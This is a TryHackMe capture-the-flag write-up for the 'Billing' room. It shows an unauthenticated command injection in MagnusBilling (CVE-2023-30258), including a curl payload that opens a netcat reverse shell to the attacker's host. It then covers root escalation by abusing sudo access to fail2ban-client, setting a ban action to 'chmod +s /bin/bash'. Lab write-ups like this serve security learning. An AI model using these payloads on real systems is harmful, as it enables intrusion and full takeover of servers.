---
title: "TryHackMe: Billing"
author: jaxafed
categories: [TryHackMe]
tags: [web, command injection, sudo, fail2ban]
render_with_liquid: false
media_subpath: /images/tryhackme_billing/
image:
  path: room_image.webp
---

**Billing** was a straightforward room where we exploited a command injection vulnerability in the **MagnusBilling** web application to gain an initial foothold. Afterwards, using our sudo privileges, which allowed us to interact with and configure the **fail2ban-server**, we successfully escalated to the **root** user and completed the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/billing){: .center }

## Initial Enumeration

### Nmap Scan

We start with an **`nmap`** scan:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.160.86
Not shown: 65528 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp    open     http     Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling
|_Requested resource was http://10.10.160.86/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry
|_/mbilling/
3306/tcp  open     mysql    MariaDB (unauthorized)
5038/tcp  open     asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are four open ports:

- **22** (`SSH`)
- **80** (`HTTP`)
- **3306** (`MySQL`)
- **5038** (`Asterisk`)

### Web 80

Visiting `http://10.10.160.86/` redirects us to `/mbilling/`, where we find the **MagnusBilling** application running.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

By checking some common files for the application, we can identify the **MagnusBilling** version as `7.x.x` from the `README.md` file.

![Web 80 Mbilling Readme](web_80_mbilling_readme.webp){: width="1200" height="600"}

## Shell as asterisk

Searching for vulnerabilities in **MagnusBilling 7**, we can discover it is vulnerable to **`CVE-2023-30258`**, an unauthenticated command injection vulnerability. A detailed advisory for this vulnerability with a proof-of-concept (PoC) is available [here](https://eldstal.se/advisories/230327-magnusbilling.html).

![Magnusbilling Command Injection Poc](magnusbilling_command_injection_poc.webp){: width="900" height="600"}

Reviewing the [vulnerable code](https://github.com/magnussolution/magnusbilling7/blob/f6cd038161349895ff6f186405b9a89f564c9448/lib/icepay/icepay.php#L753) referenced in the advisory shows that if the `democ` GET parameter is provided (and is longer than 5 characters) in a request to the `/lib/icepay/icepay.php` endpoint, a command is built as:

```php
"touch " . $_GET['democ'] . '.txt'
```

This string is then passed to the `exec()` function, making the code vulnerable to command injection.

![Magnusbilling Vulnerable Code](magnusbilling_vulnerable_code.webp){: width="700" height="300"}

Testing the PoC from the advisory with `sleep` commands confirms the vulnerability, as the server consistently takes longer than the specified duration in our `sleep` commands to respond, indicating that they are being executed.

```console
$ time curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php?democ=;sleep+2;'

real    2.19s

$ time curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'

real    5.27s
```

Using this vulnerability, we can send a command injection payload with a reverse shell command via **`curl`** to obtain a shell:

```console
$ curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.64.79 443 >/tmp/f;'
```
{: .wrap }

Checking our listener, we see a shell as the **asterisk** user and can read the user flag at `/home/magnus/user.txt`:

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.8.64.79] from (UNKNOWN) [10.10.160.86] 41006
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

asterisk@Billing:/var/www/html/mbilling/lib/icepay$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ wc -c /home/magnus/user.txt
38 /home/magnus/user.txt
```

## Shell as root

Checking the **sudo** privileges for the **asterisk** user, we find that the user is allowed to run the `fail2ban-client` command as **root** without a password:

```console
asterisk@Billing:/$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

**fail2ban-client** is a command-line interface that allows us to interact with, configure, and control the **fail2ban-server**. To give a brief explanation, **fail2ban** is a security tool that monitors log files for suspicious activities (such as repeated failed login attempts) and bans the offending IP addresses by updating firewall rules.

Checking the running processes, **fail2ban-server** is running as **root**, as expected.

```console
asterisk@Billing:/$ ps -aux | grep fail
root         539  0.2  1.4 1167416 27992 ?       Ssl  13:10   0:08 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

Checking the status of the **fail2ban-server**, we see 8 active jails.

```console
asterisk@Billing:/$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```
{: .wrap }

`Jails` are basically configurations that define which logs to monitor, the patterns to look for, and the actions to take when a pattern is matched.

Checking the `/etc/fail2ban/jail.local` file, we can see an example of a `jail`:

```console
[asterisk-iptables]
enabled  = true
filter   = asterisk
action   = iptables-allports[name=ASTERISK, port=all, protocol=all]
logpath  = /var/log/asterisk/messages
maxretry = 5
bantime = 600
```

From the configuration, among other things, we see that the `asterisk-iptables` jail monitors the `/var/log/asterisk/messages` log file and checks for patterns defined in the `asterisk` filter (`/etc/fail2ban/filter.d/asterisk.conf`). When those patterns are matched, it performs the appropriate action defined in the `iptables-allports` action (`/etc/fail2ban/action.d/iptables-allports.conf`).

To use **fail2ban** to execute commands as **root**, we can modify one of the actions defined for the jail, such as the action to perform (command to execute) when banning an IP. 

First, we retrieve the currently set actions for one of the active jails.

```console
asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
```

Next, we modify the command for the `actionban` in the `iptables-allports-ASTERISK` action, which is executed when banning an IP for the **asterisk-iptables** jail. We set it to run our command that sets the **setuid** bit on **/bin/bash** instead, as follows:

```console
asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>

asterisk@Billing:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash

asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
chmod +s /bin/bash
```
{: .wrap }

Now, we can manually ban an IP address for the **asterisk-iptables** jail, which will execute the command for `actionban` defined in the `iptables-allports-ASTERISK` action.

```console
asterisk@Billing:/$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

asterisk@Billing:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
1

asterisk@Billing:/$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Finally, with the **setuid** bit set on the **/bin/bash** binary, we can use it to obtain a shell and read the root flag at `/root/root.txt` to complete the room.

```console
asterisk@Billing:/$ /bin/bash -p
bash-5.1# python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
root@Billing:/# id
uid=0(root) gid=0(root) groups=0(root),1001(asterisk)
root@Billing:/# wc -c /root/root.txt
38 /root/root.txt
```

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>